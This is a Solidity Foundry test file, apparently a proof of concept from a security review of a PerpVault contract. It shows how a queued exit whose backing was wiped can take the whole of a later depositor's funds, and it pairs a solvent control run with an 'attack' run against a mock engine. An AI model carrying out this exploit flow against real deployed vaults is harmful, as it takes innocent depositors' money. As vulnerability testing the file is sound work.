// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {PerpVault} from "../../cauldron/PerpVault.sol";

/**
 * K3a — a QUEUED exit whose backing was wiped is written down only LAZILY, inside
 * {PerpVault.claimPendingEth}. Until the claimant calls it, the nominal claim
 * stands at full size. {PerpVault.deposit} has NO solvency gate: it prices the
 * new stake at `assetsEth() = totalEth() - pendingEth`, which SATURATES AT ZERO,
 * so a depositor into a queue-underwater vault mints shares worth nothing and
 * hands 100% of their principal to the stale queue entry.
 */
contract K3a_StaleQueueEatsDeposit is Test {
    MockEngine engine;
    PerpVault vault;
    address alice = address(0xA11CE); // the queued LP
    address bob = address(0xB0B);     // the victim depositor

    function setUp() public {
        engine = new MockEngine();
        vault = new PerpVault(address(engine), address(engine));
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
    }

    // ── POSITIVE CONTROL: a solvent vault pays a queued exit and a fresh
    //    depositor keeps their money. ────────────────────────────────────────
    function _solventRun() internal returns (uint256 bobRedeemable, uint256 aliceGot) {
        vm.prank(alice);
        uint256 sh = vault.depositEth{value: 10 ether}();
        engine.lend(10 ether);                 // 100% utilised → nothing free
        vm.prank(alice);
        vault.withdrawEth(sh);                 // fully queued
        engine.repay(10 ether, 0);             // positions close, capital returns

        uint256 before = alice.balance;
        vm.prank(bob);
        vault.depositEth{value: 10 ether}();
        (bobRedeemable,,) = vault.ethPosition(bob);
        vm.prank(alice);
        vault.claimPendingEth();
        aliceGot = alice.balance - before;
    }

    function test_positive_solventVault_queueAndDepositBothWhole() public {
        (uint256 bobRedeemable, uint256 aliceGot) = _solventRun();
        assertApproxEqAbs(aliceGot, 10 ether, 1e12, "alice's queued exit paid in full");
        assertApproxEqAbs(bobRedeemable, 10 ether, 1e12, "bob keeps his deposit");
    }

    // ── ATTACK: same flow, but the lent capital is lost before bob deposits. ──
    function _insolventRun() internal returns (uint256 bobRedeemable, uint256 aliceGot, uint256 bobPaid) {
        vm.prank(alice);
        uint256 sh = vault.depositEth{value: 10 ether}();
        engine.lend(10 ether);
        vm.prank(alice);
        (uint256 paid, uint256 queued) = vault.withdrawEth(sh);
        assertEq(paid, 0, "nothing free");
        assertApproxEqAbs(queued, 10 ether, 1e12, "10 ETH queued");

        engine.wipe(10 ether); // total bad debt: totalEth() == 0, pendingEth == 10e18
        assertEq(engine.totalEth(), 0, "backing wiped");
        // alice deliberately does NOT call claimPendingEth (that would write her
        // claim down to zero via _haircut). Her nominal stays at 10 ETH.
        assertApproxEqAbs(vault.pendingEth(), 10 ether, 1e12, "stale claim stands at full size");

        uint256 aliceBefore = alice.balance;
        uint256 bobBefore = bob.balance;
        vm.prank(bob);
        vault.depositEth{value: 10 ether}();      // no guard, no revert
        bobPaid = bobBefore - bob.balance;
        (bobRedeemable,,) = vault.ethPosition(bob);

        vm.prank(alice);
        vault.claimPendingEth();                  // backing >= claims again → NO haircut
        aliceGot = alice.balance - aliceBefore;
    }

    function test_attack_staleQueueTakes100PctOfAFreshDeposit() public {
        (uint256 bobRedeemable, uint256 aliceGot, uint256 bobPaid) = _insolventRun();
        assertEq(bobPaid, 10 ether, "bob paid 10 ETH in");
        assertLt(bobRedeemable, 1e9, "bob's shares are worth ~0 the instant they mint");
        assertApproxEqAbs(aliceGot, 10 ether, 1e12, "alice's already-worthless claim took bob's whole deposit");
    }
}

contract MockEngine {
    address public vault;
    uint256 public plv;
    uint256 public lentEth;

    function quote() external pure returns (address) { return address(0); }
    function currentToken() external pure returns (address) { return address(0); }
    function fundFromVault(uint256 amount) external payable { plv += amount; }
    function withdrawPlvTo(uint256 amount, address to) external {
        require(amount <= plv, "free");
        plv -= amount;
        (bool ok,) = to.call{value: amount}("");
        require(ok, "send");
    }
    function fundTokenFromVault(uint256) external pure { revert("n/a"); }
    function withdrawPlvTokenTo(uint256, address) external pure { revert("n/a"); }
    function totalEth() external view returns (uint256) { return plv + lentEth; }
    function freeEth() external view returns (uint256) { return plv; }
    function totalTokenAssets() external pure returns (uint256) { return 0; }
    function freeToken() external pure returns (uint256) { return 0; }
    function tokYieldCumulative() external pure returns (uint256) { return 0; }
    function withdrawTokYieldTo(uint256, address) external pure { revert("n/a"); }

    function lend(uint256 a) external { plv -= a; lentEth += a; }
    function repay(uint256 a, uint256 profit) external { lentEth -= a; plv += a + profit; }
    /// @dev Bad debt: the lent capital never comes back (mirrors _absorbPlvLoss
    ///      driving plv to 0 with longOiEth already retired in _settle).
    function wipe(uint256 a) external {
        lentEth -= a;
        payable(address(0xdead)).transfer(a);
    }
    receive() external payable {}
}
